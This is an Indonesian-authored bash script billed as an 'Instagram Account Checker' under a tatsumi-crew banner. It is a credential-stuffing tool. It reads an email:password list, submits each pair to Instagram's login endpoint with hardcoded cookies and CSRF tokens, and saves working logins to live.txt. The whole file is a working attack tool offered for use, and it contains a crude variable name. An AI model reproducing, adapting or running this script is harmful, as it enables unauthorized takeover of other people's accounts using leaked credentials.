#!/bin/bash
#coded By Arvan Apriyana
waktu=$(date '+%Y-%m-%d %H:%M:%S')
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
CYAN="\e[36m"
LIGHTGREEN="\e[92m"
MARGENTA="\e[35m"
BLUE="\e[34m"
BOLD="\e[1m"
NOCOLOR="\e[0m"
header(){
printf "${GREEN}
         ####################################
         ####################################
         #######                      #######
         #######                      #######${BLUE}
         ####### www.tatsumi-crew.net #######
         ###############      ###############
         ###############      ###############
         ###############      ###############
         ###############      ###############${RED}
         #######    ####      ####    #######
         #######    ####      ####    #######
         #######    ##############    #######
         #######    ##############    #######
         #######                      #######
         ####################################
         ####################################${NOCOLOR}
         ------------------------------------
               Instagram Account Checker
         ------------------------------------
"
}
scanskrng(){
    cekvalid=$(curl 'https://www.instagram.com/accounts/login/ajax/' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:62.0) Gecko/20100101 Firefox/62.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: https://www.instagram.com/accounts/login/?source=auth_switcher' -H 'X-CSRFToken: wlQIvzn15oniituLCZSAGGVZjfV0UcS5' -H 'X-Instagram-AJAX: 2187d49e65cd' -H 'Content-Type: application/x-www-form-urlencoded' -H 'X-Requested-With: XMLHttpRequest' -H 'Cookie: mcd=3; mid=W5qlQAAEAAFXPreV3XNacJ61ALnR; csrftoken=wlQIvzn15oniituLCZSAGGVZjfV0UcS5; csrftoken=wlQIvzn15oniituLCZSAGGVZjfV0UcS5; fbm_124024574287414=base_domain=.instagram.com; fbsr_124024574287414=ihuAH-2s8j0SDws2-U5W_VEBnKiKqhB8CMiRYxkPn6g.eyJhbGdvcml0aG0iOiJITUFDLVNIQTI1NiIsImNvZGUiOiJBUURpa2xfMTBRejFNOGN0d2J6WmlGS0UxdzNHamRWNVhFa2NCNjVmMlFxV3hnYjNJSUFjbE55cDRoT0FZNUJRcTV1dEhaNGVrd3p1aWxTRUlFdFdMZXA0Y3ZqalhlYjhmaXRvNmNyclpwOGlqd2lMWTdja0tUNmlacEtINUhoTi1lVzdsMzRreDJSRndwVF84YW54MnFhbGRubjU5MWR2bURPU0lHdFIyOTJwM0U2d2g0eHBPYzhEb3dSaTFNeG5vVnlvcHEzWkJCeFN0Yi03Qm51VWV6QkhkbVU1U3hvWEVadXpyd0FSeG9oMmNEYndRcHJoZ2pNdFktekZyaXpuRWtDdF9QbUdIX0RKSXRxY2JzRWxpYjBHbVFUVGE3WEhiME1LUm9MU2FYNlhQUjk1UGswSnI5aFk3aWtMWHlVSkt5Yy1YN0oxVzVsdVJqZzRGLVg0MlRidnBDNFdYWHpRRDhzZmF6RVZfQkhXS1EiLCJpc3N1ZWRfYXQiOjE1MzY4OTIwMDUsInVzZXJfaWQiOiIxMDAwMDQwNzk4NzUwNzEifQ; rur=PRN; urlgen="{}:1g0dk9:nMpYRFIKbmnIpmhnWNgilpDxlGc"' -H 'Connection: keep-alive' --data "username=$1&password=$2&queryParams=%7B%22source%22%3A%22auth_switcher%22%7D" --compressed -D - -s);
    cek=$(echo $cekvalid | grep -Po '(?<=reactivated":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
    if [[ $cek =~ "true" ]]; then
        printf "${GREEN}[LIVE] $1|$2 $user[$waktu]\n";
        echo "[LIVE] $1|$2 [$waktu]" >> live.txt
        printf "${NORMAL}"
    else
        printf "${RED}[DIE] $1|$2 [$waktu]\n";
        printf "${NORMAL}"
    fi
}
header
echo ""
echo "List In This Directory : "
ls
echo "Delimeter list -> email:password"
echo -n "Masukan File List : "
read list
if [ ! -f $list ]; then
    echo "$list No Such File"
exit
fi

    x=$(gawk -F: '{ print $1 }' $list)
    y=$(gawk -F: '{ print $2 }' $list)
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'emailgblg=($x)'
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'passwordna=($y)'
	for (( i = 0; i < "${#emailgblg[@]}"; i++ )); do
    emailna="${emailgblg[$i]}"
    kontol="${passwordna[$i]}"
    scanskrng $emailna $kontol
done
